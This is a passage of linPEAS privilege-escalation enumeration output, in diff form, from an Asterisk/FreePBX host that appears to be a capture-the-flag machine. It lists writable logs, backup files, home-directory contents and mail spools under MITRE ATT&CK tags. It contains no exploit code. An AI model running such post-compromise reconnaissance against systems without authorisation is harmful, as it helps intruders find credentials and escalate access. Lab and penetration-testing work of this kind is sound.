+2025-11-30+14:39:29.1382589610 /var/lib/asterisk/agi-bin/allowlist-autoadd.agi
+2025-11-30+14:39:29.1372589390 /var/lib/asterisk/agi-bin/allowlist-common.php
+2025-11-30+14:34:45.3369868440 /usr/local/bin/pbx-backup.sh
+2025-11-30+14:14:32.9577204300 /etc/rc.d/init.d/vega_bridge
+2025-11-30+14:14:32.3627199760 /usr/local/bin/pnp_server
+
+╔══════════╣ Unexpected in /opt (usually empty) (T1083)
+total 0
+drwxr-xr-x.  3 root root  16 Nov 30  2025 .
+dr-xr-xr-x. 18 root root 240 Nov 30  2025 ..
+drwxr-xr-x.  2 root root   6 Oct 30  2018 rh
+
+╔���═════════╣ Unexpected in root (T1083)
+/tftpboot
+
+╔══════════╣ Modified interesting files in the last 5mins (limit 100) (T1083)
+/var/log/asterisk/freepbx.log
+/var/log/asterisk/fail2ban
+/var/log/cron
+/var/log/secure
+/var/log/messages
+/var/log/laurel/audit.log.2
+/var/log/laurel/audit.log
+/var/log/laurel/audit.log.8
+/var/log/laurel/audit.log.7
+/var/log/laurel/audit.log.6
+/var/log/laurel/audit.log.4
+/var/log/laurel/audit.log.3
+/var/log/laurel/audit.log.1
+/var/log/laurel/audit.log.5
+
+logrotate 3.8.6
+╔══════════╣ Syslog configuration (limit 50) (T1070.002)
+
+
+
+$ModLoad imuxsock # provides support for local system logging (e.g. via logger command)
+$ModLoad imjournal # provides access to the systemd journal
+
+
+
+
+
+$WorkDirectory /var/lib/rsyslog
+
+$ActionFileDefaultTemplate RSYSLOG_TraditionalFileFormat
+
+
+$IncludeConfig /etc/rsyslog.d/*.conf
+
+$OmitLocalLogging on
+
+$IMJournalStateFile imjournal.state
+
+
+
+
+*.info;mail.none;authpriv.none;cron.none                /var/log/messages
+
+authpriv.*                                              /var/log/secure
+
+mail.*                                                  -/var/log/maillog
+
+
+cron.*                                                  /var/log/cron
+
+*.emerg                                                 :omusrmsg:*
+
+uucp,news.crit                                          /var/log/spooler
+
+local7.*                                                /var/log/boot.log
+
+
+╔══════════╣ Auditd configuration (limit 50) (T1070.002)
+auditd configuration Not Found
+╔══════════╣ Log files with potentially weak perms (limit 50) (T1070.002)
+8409174  320 -rw-r--r--   1 asterisk asterisk   200652 Jun 21 18:47 /var/log/asterisk/freepbx.log
+9186307    4 -rw-r--r--   1 asterisk asterisk       38 May 25 10:59 /var/log/asterisk/queue_log-20260525
+8409184   48 -rw-r--r--   1 asterisk asterisk    47774 May 25 11:22 /var/log/asterisk/full-20260525
+8409185   64 -rw-r--r--   1 asterisk asterisk    65304 May 25 11:22 /var/log/asterisk/fail2ban-20260525
+8409182   16 -rw-r--r--   1 asterisk asterisk    15548 Jun 21 18:11 /var/log/asterisk/freepbx_security.log
+8409186    4 -rw-r-----   1 asterisk asterisk      384 Jun 21 17:51 /var/log/asterisk/queue_log-20260621
+10367045    4 -rw-r-----   1 asterisk asterisk       80 Jun 21 18:11 /var/log/asterisk/queue_log
+8409188  444 -rw-r-----   1 asterisk asterisk   452336 Jun 21 18:11 /var/log/asterisk/full-20260621
+10367046    4 -rw-r-----   1 asterisk asterisk     2609 Jun 21 18:12 /var/log/asterisk/full
+8409192  416 -rw-r-----   1 asterisk asterisk   425853 Jun 21 18:11 /var/log/asterisk/fail2ban-20260621
+10367047   52 -rw-r-----   1 asterisk asterisk    50572 Jun 21 18:47 /var/log/asterisk/fail2ban
+13984091 4884 -rw-------   1 _laurel  _laurel   5001000 Jun 21 18:47 /var/log/laurel/audit.log.2
+13984094   16 -rw-------   1 _laurel  _laurel     13913 Jun 21 18:47 /var/log/laurel/audit.log
+15569963 4884 -rw-------   1 _laurel  _laurel   5000509 May 25 11:11 /var/log/laurel/audit.log.32
+15569966 4884 -rw-------   1 _laurel  _laurel   5000305 May 25 11:33 /var/log/laurel/audit.log.31
+15569972 4884 -rw-------   1 _laurel  _laurel   5000491 May 27 13:32 /var/log/laurel/audit.log.30
+15569974 4884 -rw-------   1 _laurel  _laurel   5000525 Jun  2 13:55 /var/log/laurel/audit.log.28
+15569977 4884 -rw-------   1 _laurel  _laurel   5001013 Jun 21 18:15 /var/log/laurel/audit.log.26
+13984058 4884 -rw-------   1 _laurel  _laurel   5001169 Jun 21 18:22 /var/log/laurel/audit.log.24
+13984071 4884 -rw-------   1 _laurel  _laurel   5000992 Jun 21 18:23 /var/log/laurel/audit.log.22
+13984073 4884 -rw-------   1 _laurel  _laurel   5000458 Jun 21 18:25 /var/log/laurel/audit.log.20
+13984074 4884 -rw-------   1 _laurel  _laurel   5000539 Jun 21 18:25 /var/log/laurel/audit.log.19
+13984075 4884 -rw-------   1 _laurel  _laurel   5000210 Jun 21 18:26 /var/log/laurel/audit.log.18
+13984077 4884 -rw-------   1 _laurel  _laurel   5000572 Jun 21 18:30 /var/log/laurel/audit.log.16
+13984078 4884 -rw-------   1 _laurel  _laurel   5001013 Jun 21 18:31 /var/log/laurel/audit.log.15
+13984079 4884 -rw-------   1 _laurel  _laurel   5000056 Jun 21 18:31 /var/log/laurel/audit.log.14
+13984081 4884 -rw-------   1 _laurel  _laurel   5000098 Jun 21 18:32 /var/log/laurel/audit.log.12
+13984066 4884 -rw-------   1 _laurel  _laurel   5000166 Jun 21 18:33 /var/log/laurel/audit.log.11
+13984082 4884 -rw-------   1 _laurel  _laurel   5000869 Jun 21 18:33 /var/log/laurel/audit.log.10
+13984085 4884 -rw-------   1 _laurel  _laurel   5000923 Jun 21 18:44 /var/log/laurel/audit.log.8
+13984086 4888 -rw-------   1 _laurel  _laurel   5002617 Jun 21 18:44 /var/log/laurel/audit.log.7
+13984087 4884 -rw-------   1 _laurel  _laurel   5000640 Jun 21 18:44 /var/log/laurel/audit.log.6
+13984089 4884 -rw-------   1 _laurel  _laurel   5000679 Jun 21 18:45 /var/log/laurel/audit.log.4
+13984090 4884 -rw-------   1 _laurel  _laurel   5000898 Jun 21 18:46 /var/log/laurel/audit.log.3
+13984083 4904 -rw-------   1 _laurel  _laurel   5018510 Jun 21 18:47 /var/log/laurel/audit.log.1
+15569973 4884 -rw-------   1 _laurel  _laurel   5001026 Jun  2 13:45 /var/log/laurel/audit.log.29
+15569975 4888 -rw-------   1 _laurel  _laurel   5001242 Jun 21 17:49 /var/log/laurel/audit.log.27
+15569971 4884 -rw-------   1 _laurel  _laurel   5000890 Jun 21 18:22 /var/log/laurel/audit.log.25
+13984070 4884 -rw-------   1 _laurel  _laurel   5000604 Jun 21 18:22 /var/log/laurel/audit.log.23
+13984072 4884 -rw-------   1 _laurel  _laurel   5000061 Jun 21 18:24 /var/log/laurel/audit.log.21
+13984076 4884 -rw-------   1 _laurel  _laurel   5001004 Jun 21 18:30 /var/log/laurel/audit.log.17
+13984080 4884 -rw-------   1 _laurel  _laurel   5000213 Jun 21 18:31 /var/log/laurel/audit.log.13
+13984084 4884 -rw-------   1 _laurel  _laurel   5000200 Jun 21 18:37 /var/log/laurel/audit.log.9
+13984088 4884 -rw-------   1 _laurel  _laurel   5000837 Jun 21 18:45 /var/log/laurel/audit.log.5
+
+╔══════════╣ Files inside /home/asterisk (limit 20) (T1083)
+total 1456
+drwxr-xr-x. 10 asterisk asterisk    4096 Jun 21 18:34 .
+drwxr-xr-x.  3 root     root          22 May 21 07:50 ..
+-rw-------   1 asterisk asterisk      13 Jun  4 11:24 .asterisk_history
+-rw-------   1 asterisk asterisk     495 Jun 21 18:36 .bash_history
+-rw-r--r--.  1 asterisk asterisk      18 Dec  6  2016 .bash_logout
+-rw-r--r--.  1 asterisk asterisk     193 Dec  6  2016 .bash_profile
+-rw-r--r--.  1 asterisk asterisk     231 Dec  6  2016 .bashrc
+drwxrwxr-x   3 asterisk asterisk      18 Jun  4 11:23 .cache
+drwxr-xr-x.  4 asterisk asterisk      37 Jun  4 11:23 .config
+drwxrwxr-x.  2 asterisk asterisk      83 Jun 21 18:46 .gnupg
+-rw-rw-r--   1 asterisk asterisk 1063041 Jun 21 18:19 linpeas.sh
+drwxr-xr-x.  4 asterisk asterisk      28 Nov 30  2025 .node
+drwxr-xr-x.  3 asterisk asterisk      20 Nov 30  2025 .node-gyp
+drwxr-xr-x.  5 asterisk asterisk      86 Nov 30  2025 .npm
+-rw-r--r--.  1 asterisk asterisk      18 Nov 30  2025 .npmrc
+-rw-r--r--   1 asterisk asterisk       0 May 19 18:41 .odbc.ini
+-rw-rw-r--   1 asterisk asterisk  389680 Jun 21 18:34 output.txt
+drwxr-xr-x.  3 asterisk asterisk      17 Nov 30  2025 .package_cache
+drwxrwxr-x.  5 asterisk asterisk     165 Nov 30  2025 .pm2
+-rw-r-----   1 root     asterisk      33 Jun 21 17:50 user.txt
+
+╔══════════╣ Files inside others home (limit 20) (T1552.001)
+/var/www/html/.htaccess
+/var/www/html/admin/.htaccess
+/var/www/html/admin/.user.ini
+/var/www/html/admin/ajax.php
+/var/www/html/admin/api/.htaccess
+/var/www/html/admin/api/api.php
+/var/www/html/admin/assets/css/bootstrap-3.3.7.min.css
+/var/www/html/admin/assets/css/bootstrap-rtl.css
+/var/www/html/admin/assets/css/bootstrap-table-dev.css
+/var/www/html/admin/assets/css/bootstrap-table-reorder-rows.css
+/var/www/html/admin/assets/css/chosen.min.css
+/var/www/html/admin/assets/css/custom-theme/images/ui-bg_flat_0_999999_40x100.png
+/var/www/html/admin/assets/css/custom-theme/images/ui-bg_flat_0_aaaaaa_40x100.png
+/var/www/html/admin/assets/css/custom-theme/images/ui-bg_glass_55_fbf9ee_1x400.png
+/var/www/html/admin/assets/css/custom-theme/images/ui-bg_glass_65_ffffff_1x400.png
+/var/www/html/admin/assets/css/custom-theme/images/ui-bg_glass_75_dadada_1x400.png
+/var/www/html/admin/assets/css/custom-theme/images/ui-bg_glass_75_e6e6e6_1x400.png
+/var/www/html/admin/assets/css/custom-theme/images/ui-bg_glass_75_ffffff_1x400.png
+/var/www/html/admin/assets/css/custom-theme/images/ui-bg_highlight-soft_75_cccccc_1x100.png
+/var/www/html/admin/assets/css/custom-theme/images/ui-bg_inset-soft_95_fef1ec_1x100.png
+grep: write error
+
+╔══════════╣ Searching installed mail applications (T1114.001)
+mailq.postfix
+newaliases.postfix
+postfix
+rmail.postfix
+sendmail
+sendmail.postfix
+
+╔══════════╣ Mails (limit 50) (T1114.001)
+13822901    0 -rw-rw----   1 rpc      mail            0 Nov 30  2025 /var/mail/rpc
+15569967    4 -rw-------   1 root     mail          580 Dec  3  2025 /var/mail/root
+13822901    0 -rw-rw----   1 rpc      mail            0 Nov 30  2025 /var/spool/mail/rpc
+15569967    4 -rw-------   1 root     mail          580 Dec  3  2025 /var/spool/mail/root
+
+╔══════════╣ Backup folders (T1552.001)
+drwxrwxr-x. 2 asterisk asterisk 36 Nov 30  2025 /etc/asterisk/backup
+total 0
+-rw-rw-r--. 1 asterisk asterisk 0 Sep  8  2021 ari.conf.bk.1698911536
+drwx------. 2 root root 30 Nov 30  2025 /etc/lvm/backup
+drwxr-xr-x 3 root root 21 May 21 10:37 /var/backups
+total 0
+drwxr-xr-x 2 root root 6 May 21 10:37 hygiene
+
+lrwxrwxrwx. 1 asterisk asterisk 41 Nov 30  2025 /var/www/html/admin/assets/backup -> /var/www/html/admin/modules/backup/assets
+lrwxrwxrwx. 1 asterisk asterisk 41 Nov 30  2025 /var/www/html/admin/assets/backup -> /var/www/html/admin/modules/backup/assets
+
+drwxrwxr-x. 2 asterisk asterisk 24 Nov 30  2025 /var/www/html/admin/modules/adv_recovery/assets/css/backup
+total 4
+-rw-rw-r--. 1 asterisk asterisk 474 Nov  2  2023 cronui.css
+
+drwxrwxr-x. 17 asterisk asterisk 4096 Nov 30  2025 /var/www/html/admin/modules/backup
+total 192
+drwxrwxr-x.  3 asterisk asterisk    17 Nov 30  2025 Api
+drwxrwxr-x.  6 asterisk asterisk    53 Nov 30  2025 assets
+-rw-rw-r--.  1 asterisk asterisk  7956 Nov  2  2023 BackupBase.php
+-rw-rw-r--.  1 asterisk asterisk 49858 Nov  2  2023 Backup.class.php
+-rw-rw-r--.  1 asterisk asterisk   267 Nov  2  2023 Backup.php
+-rw-rw-r--.  1 asterisk asterisk   237 Nov  2  2023 composer.json
+-rw-rw-r--.  1 asterisk asterisk 11649 Nov  2  2023 composer.lock
+drwxrwxr-x.  2 asterisk asterisk    30 Nov 30  2025 Console
+drwxrwxr-x.  2 asterisk asterisk    61 Nov 30  2025 examples
+drwxrwxr-x.  2 asterisk asterisk    30 Nov 30  2025 functions.inc
+drwxrwxr-x.  4 asterisk asterisk   123 Nov 30  2025 Handlers
+drwxr-xr-x.  2 asterisk asterisk    94 Nov 30  2025 hooks
+drwxrwxr-x. 19 asterisk asterisk   239 Nov 30  2025 i18n
+drwxrwxr-x.  2 asterisk asterisk    77 Nov 30  2025 Json
+-rw-rw-r--.  1 asterisk asterisk 35147 Nov  2  2023 LICENSE
+drwxrwxr-x.  2 asterisk asterisk    65 Nov 30  2025 Migration
+drwxrwxr-x.  2 asterisk asterisk   116 Nov 30  2025 Models
+-rw-rw-r--.  1 asterisk asterisk 22225 Nov  2  2023 module.sig
+-rw-rw-r--.  1 asterisk asterisk  6020 Nov  2  2023 module.xml
+drwxrwxr-x.  2 asterisk asterisk    48 Nov 30  2025 Monolog
+-rw-rw-r--.  1 asterisk asterisk   127 Nov  2  2023 page.backup.php
+-rw-rw-r--.  1 asterisk asterisk  1505 Nov  2  2023 phpcs.xml
+-rw-rw-r--.  1 asterisk asterisk  1450 Nov  2  2023 phpunit.xml
+-rw-rw-r--.  1 asterisk asterisk  1647 Nov  2  2023 README.md
+-rw-rw-r--.  1 asterisk asterisk 20497 Nov  2  2023 RestoreBase.php
+-rw-rw-r--.  1 asterisk asterisk   354 Nov  2  2023 Restore.php
+drwxrwxr-x.  3 asterisk asterisk    74 Nov 30  2025 utests
+drwxrwxr-x.  7 asterisk asterisk   108 Nov 30  2025 vendor
+drwxrwxr-x.  4 asterisk asterisk    90 Nov 30  2025 views
+
+drwxrwxr-x. 2 asterisk asterisk 24 Nov 30  2025 /var/www/html/admin/modules/backup/assets/css/backup
+total 4
+-rw-rw-r--. 1 asterisk asterisk 474 Nov  2  2023 cronui.css
+
+drwxrwxr-x. 2 asterisk asterisk 136 Nov 30  2025 /var/www/html/admin/modules/backup/views/backup
+total 68
+-rw-rw-r--. 1 asterisk asterisk 24907 Nov  2  2023 form.php
+-rw-rw-r--. 1 asterisk asterisk  1259 Nov  2  2023 grid.php
+-rw-rw-r--. 1 asterisk asterisk  1376 Nov  2  2023 item_table.php
+-rw-rw-r--. 1 asterisk asterisk   289 Nov  2  2023 rsa.php
+-rw-rw-r--. 1 asterisk asterisk   684 Nov  2  2023 settings.php
+-rw-rw-r--. 1 asterisk asterisk  1762 Nov  2  2023 transfer.php
+-rw-rw-r--. 1 asterisk asterisk 19910 Nov  2  2023 warmspare.php
+
+drwxrwxr-x. 3 asterisk asterisk 24 Nov 30  2025 /var/www/html/admin/modules/cloudmigration/vendor/aws/aws-sdk-php/src/data/backup
+total 0
+drwxrwxr-x. 2 asterisk asterisk 57 Nov 30  2025 2018-11-15
+
+drwxrwxr-x. 3 asterisk asterisk 24 Nov 30  2025 /var/www/html/admin/modules/filestore/vendor/aws/aws-sdk-php/src/data/backup
+total 0
+drwxrwxr-x. 2 asterisk asterisk 57 Nov 30  2025 2018-11-15
+
+
+╔══════════╣ Backup files (limited 100) (T1552.001)
+-rw-r--r--. 1 root root 1938 Mar 31  2020 /etc/nsswitch.conf.bak
+-rw-rw-r--. 1 asterisk asterisk 0 Sep  8  2021 /etc/asterisk/backup/ari.conf.bk.1698911536
+-rwxrwxr-x. 1 asterisk asterisk 3212 Nov 30  2025 /var/lib/asterisk/agi-bin/backuprecordings.php
+-rw-rw-r--. 1 asterisk asterisk 0 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/assets/css/backup_restore/backup_restore.css
+-rw-rw-r--. 1 asterisk asterisk 32107 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/backup.pot
+-rw-rw-r--. 1 asterisk asterisk 2148 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/bg_BG/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 67188 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/bg_BG/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 4086 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/de_DE/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 62513 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/de_DE/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 4474 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/es_ES/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 83530 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/es_ES/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 5184 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/fa_IR/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 69729 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/fa_IR/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 1232 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/fr_FR/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 46453 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/fr_FR/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 327 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/he_IL/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 39801 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/he_IL/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 514 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/hu_HU/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 38974 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/hu_HU/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 524 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/it_IT/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 39901 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/it_IT/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 1724 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/ja_JP/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 60716 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/ja_JP/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 1726 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/nl_NL/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 53982 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/nl_NL/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 3782 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/pl/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 57080 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/pl/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 4194 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/pt_BR/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 63891 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/pt_BR/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 1772 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/pt_PT/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 53904 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/pt_PT/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 4964 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/ru_RU/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 88030 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/ru_RU/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 515 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/sv_SE/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 52987 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/sv_SE/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 5229 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/vi/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 68089 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/vi/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 1000 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/zh_CN/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 39809 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/i18n/zh_CN/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 7138 Feb 13  2018 /var/www/html/admin/modules/api/node/node_modules/form-data/README.md.bak
+-rw-rw-r--. 1 asterisk asterisk 0 Nov  2  2023 /var/www/html/admin/modules/backup/assets/css/backup_restore/backup_restore.css
+-rw-rw-r--. 1 asterisk asterisk 19146 Nov  2  2023 /var/www/html/admin/modules/backup/assets/js/backup.js
+-rw-rw-r--. 1 asterisk asterisk 410 Nov  2  2023 /var/www/html/admin/modules/backup/assets/less/backup.less
+-rw-rw-r--. 1 asterisk asterisk 30712 Nov  2  2023 /var/www/html/admin/modules/backup/functions.inc/class.backup.php
+-rwxr-xr-x. 1 asterisk asterisk 2364 Nov  2  2023 /var/www/html/admin/modules/backup/hooks/perform-backup
+-rw-rw-r--. 1 asterisk asterisk 43426 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/backup.pot
+-rw-rw-r--. 1 asterisk asterisk 7100 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/bg_BG/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 38445 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/bg_BG/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 5497 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/de_DE/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 72756 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/de_DE/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 22298 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/es_ES/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 41908 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/es_ES/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 6769 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/fa_IR/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 79991 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/fa_IR/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 1461 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/fr_FR/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 31876 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/fr_FR/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 1239 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/he_IL/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 29163 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/he_IL/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 1316 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/hu_HU/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 28489 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/hu_HU/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 1492 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/it_IT/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 29280 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/it_IT/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 24483 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/ja_JP/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 37704 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/ja_JP/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 21087 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/nl_NL/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 31043 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/nl_NL/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 450 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/pl/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 22074 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/pl/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 557 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/pt_BR/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 22294 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/pt_BR/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 22027 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/pt_PT/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 31101 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/pt_PT/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 15828 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/ru_RU/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 40661 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/ru_RU/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 3932 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/sv_SE/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 40829 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/sv_SE/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 6674 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/vi/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 78357 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/vi/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 2945 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/zh_CN/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 22900 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/zh_CN/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 127 Nov  2  2023 /var/www/html/admin/modules/backup/page.backup.php
+-rw-rw-r--. 1 asterisk asterisk 5644 Nov  2  2023 /var/www/html/admin/modules/backup/utests/backupFileTest.php
+-rw-rw-r--. 1 asterisk asterisk 3262 Nov  2  2023 /var/www/html/admin/modules/cdrpro/backupcdr.php
+-rw-rw-r--. 1 asterisk asterisk 1397 Nov  2  2023 /var/www/html/admin/modules/cel/views/backupSettings.php
+-rw-rw-r--. 1 asterisk asterisk 1703 Nov  2  2023 /var/www/html/admin/modules/core/views/backupSettings.php
+-rw-rw-r--. 1 asterisk asterisk 7138 Feb 13  2018 /var/www/html/admin/modules/iotserver/node/node_modules/form-data/README.md.bak
+-rw-rw-r--. 1 asterisk asterisk 12070 Oct 26  1985 /var/www/html/admin/modules/iotserver/node/node_modules/superagent/node_modules/form-data/README.md.bak
+-rw-rw-r--. 1 asterisk asterisk 2841 Nov  2  2023 /var/www/html/admin/modules/pbxmfa/views/mfa/backupCodeActionsConfirmationModal.php
+-rw-rw-r--. 1 asterisk asterisk 29186 Nov  2  2023 /var/www/html/admin/modules/pms/ucp/assets/css/images/bgbodytest.png.old
+-rw-rw-r--. 1 asterisk asterisk 1044 Nov  2  2023 /var/www/html/admin/modules/pms/ucp/assets/css/images/bgmodulenameleft.png.old
+-rw-rw-r--. 1 asterisk asterisk 939 Nov  2  2023 /var/www/html/admin/modules/pms/ucp/assets/css/images/bgmodulenamerepeat.png.old
+-rw-rw-r--. 1 asterisk asterisk 1457 Nov  2  2023 /var/www/html/admin/modules/pms/ucp/assets/css/images/bgmodulenameright.png.old
+-rw-rw-r--. 1 asterisk asterisk 29186 Nov  2  2023 /var/www/html/admin/modules/pms/ucp/assets/less/images/bgbodytest.png.old
+-rw-rw-r--. 1 asterisk asterisk 1044 Nov  2  2023 /var/www/html/admin/modules/pms/ucp/assets/less/images/bgmodulenameleft.png.old
+-rw-rw-r--. 1 asterisk asterisk 939 Nov  2  2023 /var/www/html/admin/modules/pms/ucp/assets/less/images/bgmodulenamerepeat.png.old
+-rw-rw-r--. 1 asterisk asterisk 1457 Nov  2  2023 /var/www/html/admin/modules/pms/ucp/assets/less/images/bgmodulenameright.png.old
+
+╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100) (T1005)
